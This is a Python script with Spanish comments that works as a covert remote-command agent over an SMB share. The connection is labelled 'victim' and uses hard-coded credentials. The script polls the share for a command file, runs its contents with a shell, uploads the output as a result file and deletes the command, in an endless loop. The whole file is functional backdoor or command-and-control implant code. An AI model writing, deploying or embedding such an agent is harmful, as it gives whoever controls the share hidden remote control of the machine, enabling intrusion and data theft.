import tempfile, os, subprocess, time
from smb.SMBConnection import SMBConnection
import hashlib

file_path = "lala/"  # Definir la ruta en el recurso compartido

def setup_server():
    conn = SMBConnection("smbuser", "smbpass", "server", "victim")
    conn.connect("127.0.0.1", 445)
    return conn

def check_if_file_exists(conn, filename):
    shared_folder = "shared"  # Nombre del recurso compartido

    try:
        # Intentar obtener el archivo. Si no existe, lanza una excepción.
        file_attributes = conn.getAttributes(shared_folder, file_path + filename)
        return True  # El archivo existe
    except:
        return False  # El archivo no existe


def delete_file_from_smb(conn, filename):
    shared_folder = "shared"  # Nombre del recurso compartido

    # Intentar borrar el archivo en el recurso compartido
    conn.deleteFiles(shared_folder, file_path + filename)

def write_to_smb(conn, filename, content):
    shared_folder = "shared"  # Nombre del recurso compartido

    # Crear un archivo temporal
    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
        temp_file.write(content.encode())  # Escribir contenido en el archivo temporal
        temp_filename = temp_file.name  # Obtener el nombre del archivo temporal

    # Subir el archivo al recurso compartido
    with open(temp_filename, 'rb') as temp_file:
        conn.storeFile(shared_folder, file_path + filename, temp_file)  # Usar storeFile para subir

    # Eliminar el archivo temporal
    os.remove(temp_filename)

def read_from_smb(conn, filename):
    shared_folder = "shared"  # Nombre del recurso compartido

    # Crear un archivo temporal para almacenar el archivo descargado
    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
        local_filename = temp_file.name  # Obtener el nombre del archivo temporal

    # Descargar el archivo desde SMB
    with open(local_filename, 'wb') as local_file:
        conn.retrieveFile(shared_folder, file_path + filename, local_file)  # Descargar el archivo desde SMB

    # Leer el archivo descargado
    with open(local_filename, 'r') as f:
        command = f.read()

    # Eliminar el archivo temporal
    os.remove(local_filename)

    return command

def main():
    conn = setup_server()
    hashed_data = ""  # Inicializar hashed_data para que no haya error en la comparación

    while True:
        try:

            # Verificar si el comando ha cambiado
            if check_if_file_exists(conn, 'command.txt'):
                command = read_from_smb(conn, "command.txt")
                # Ejecutar el comando del archivo command.txt
                try:
                    response = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    write_to_smb(conn, "result.txt", response.decode())
                except subprocess.CalledProcessError as e:
                    write_to_smb(conn, "result.txt", f"Error ejecutando el comando: {e.output.decode()}")
                delete_file_from_smb(conn, 'command.txt')
            else:
                time.sleep(5)

        except Exception as e:
            print(f"Error en el servidor: {e}")

    conn.close()

if __name__ == "__main__":
    main()
